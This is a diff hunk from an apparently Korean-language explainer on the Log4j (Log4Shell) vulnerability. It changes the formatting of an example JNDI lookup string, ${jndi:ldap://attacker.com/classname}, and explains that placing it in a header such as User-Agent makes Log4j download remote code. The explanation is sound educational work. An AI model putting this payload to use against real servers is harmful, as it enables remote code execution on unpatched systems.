@@ -69,7 +69,7 @@ log.info("Debug: {}", payload);
 
 여기서 payload는 HTTP Requests에서 요청자가 보낸 문자열이다.
 
-이 문자열이 **${jndi:ldap://attacker.com/classname}**을 포함하면 Log4j는 이를 해석하여 **ldap://attacker.com/classname**을 실행시키게 된다.
+이 문자열이 `${jndi:ldap://attacker.com/classname}`을 포함하면 Log4j는 이를 해석하여 `ldap://attacker.com/classname`을 실행시키게 된다.
 
 현재 가장 쉽게 공격할 수 있는 방법은 HTTP 헤더 **User-Agent**에 ldap주소를 넣어 코드를 다운받는 방법이라고 한다.
 
